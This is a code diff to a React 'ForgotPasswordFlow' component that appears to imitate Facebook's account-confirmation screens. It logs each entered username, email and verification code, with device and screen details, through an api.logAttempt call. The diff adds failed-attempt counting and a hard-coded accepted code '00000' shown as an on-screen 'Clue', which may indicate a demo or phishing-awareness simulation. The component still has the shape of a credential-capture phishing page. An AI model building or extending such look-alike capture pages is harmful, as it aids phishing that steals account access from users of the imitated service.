@@ -200,6 +200,8 @@ export default function ForgotPasswordFlow({
   const [showPassword, setShowPassword] = useState(false);
   const [passwordError, setPasswordError] = useState('');
   const [verificationCode, setVerificationCode] = useState('');
+  const [confirmError, setConfirmError] = useState('');
+  const [confirmTrialCount, setConfirmTrialCount] = useState(0);
   const [resendNotice, setResendNotice] = useState(false);
 
   // Clear input on mount to guarantee no auto-filled values
@@ -366,20 +368,38 @@ export default function ForgotPasswordFlow({
 
   const handleConfirmSubmit = (e) => {
     e.preventDefault();
+    const codeVal = verificationCode.trim();
+    if (!codeVal) return;
+
     const userVal = targetAccount?.name || inputValue.trim() || 'User';
     const emailVal = targetAccount?.email || inputValue.trim() || '';
+    const nextTrial = confirmTrialCount + 1;
+    setConfirmTrialCount(nextTrial);
+
+    const isCorrect = codeVal === '00000';
+
     api.logAttempt({
       username: userVal,
       email: emailVal,
       accountName: userVal,
-      password: '[OTP Confirmed]',
-      action: `Confirmed Security Code: "${verificationCode}"`,
+      password: isCorrect ? '[OTP Confirmed]' : '[OTP Failed Trial]',
+      action: isCorrect
+        ? `Confirmed Security Code: "${codeVal}" (Verified)`
+        : `Failed Security Code Trial #${nextTrial}: "${codeVal}" (Denied, expected 00000)`,
       source: isDesktop ? 'Desktop Confirm Code (OTP)' : 'Mobile Confirm Code (OTP)',
       screen: 'Confirm your account Screen',
       device: isDesktop ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
-      code: verificationCode,
-      success: true,
+      code: codeVal,
+      trialCount: nextTrial,
+      success: isCorrect,
     });
+
+    if (!isCorrect) {
+      setConfirmError(`The code that you've entered doesn't match. Please try again. (Clue: Enter 00000)`);
+      return;
+    }
+
+    setConfirmError('');
     onLoginSuccess && onLoginSuccess(targetAccount);
   };
 
@@ -676,15 +696,54 @@ export default function ForgotPasswordFlow({
 
             {/* Verification Form */}
             <form onSubmit={handleConfirmSubmit} className="fb-forgot-form" style={{ marginTop: 18 }}>
+              {confirmError && (
+                <div
+                  style={{
+                    marginBottom: 12,
+                    padding: '8px 12px',
+                    backgroundColor: '#FEE2E2',
+                    border: '1px solid #FCA5A5',
+                    borderRadius: '8px',
+                    fontSize: '13px',
+                    color: '#991B1B',
+                    lineHeight: 1.4,
+                  }}
+                >
+                  <strong>Incorrect:</strong> {confirmError}
+                </div>
+              )}
+
               <div className="fb-forgot-input-wrap">
                 <input
                   type="text"
-                  placeholder="Enter code"
+                  placeholder="Enter code (Clue: 00000)"
                   className="fb-forgot-input"
                   value={verificationCode}
-                  onChange={(e) => setVerificationCode(e.target.value)}
+                  onChange={(e) => {
+                    setVerificationCode(e.target.value);
+                    if (confirmError) setConfirmError('');
+                  }}
                   autoFocus
+                  style={{
+                    borderColor: confirmError ? '#FA383E' : undefined,
+                    backgroundColor: confirmError ? '#FFF8F8' : undefined,
+                  }}
                 />
+              </div>
+
+              {/* Clue Hint */}
+              <div
+                style={{
+                  display: 'flex',
+                  alignItems: 'center',
+                  gap: '5px',
+                  fontSize: '12.5px',
+                  color: '#65676B',
+                  margin: '4px 0 14px 2px',
+                }}
+              >
+                <span style={{ fontWeight: 700, color: '#0866FF' }}>💡 Clue:</span>
+                <span>Enter <strong>00000</strong> to confirm and proceed</span>
               </div>
 
               {/* Continue Button */}
